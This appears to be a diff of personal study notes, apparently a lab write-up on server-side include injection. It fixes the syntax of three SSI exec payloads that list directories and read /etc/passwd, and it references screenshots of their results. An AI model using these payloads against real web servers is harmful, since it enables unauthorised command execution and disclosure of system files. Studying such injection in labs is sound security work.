@@ -7,12 +7,12 @@
 
 ## Workflow
 1. ![[Pasted image 20201211005339.png]]![[Pasted image 20201211005401.png]]
-2.  `<-- #exec cmd="/bin/ls /"-->`
+2.  `<!-- #exec cmd="/bin/ls /"-->`
 	1.  ![[Pasted image 20201211005521.png]]
 	2.  ![[Pasted image 20201211005542.png]]
-3.  `<-- #exec cmd="ls "-->`
+3.  `<!-- #exec cmd="ls "-->`
 	1.  ![[Pasted image 20201211005630.png]]
 	2.  ![[Pasted image 20201211005644.png]]
-4.  `<-- #exec cmd="cat /etc/passwd "-->`
+4.  `<!-- #exec cmd="cat /etc/passwd "-->`
 	1.  ![[Pasted image 20201211010212.png]]
 	2.  ![[Pasted image 20201211010224.png]]
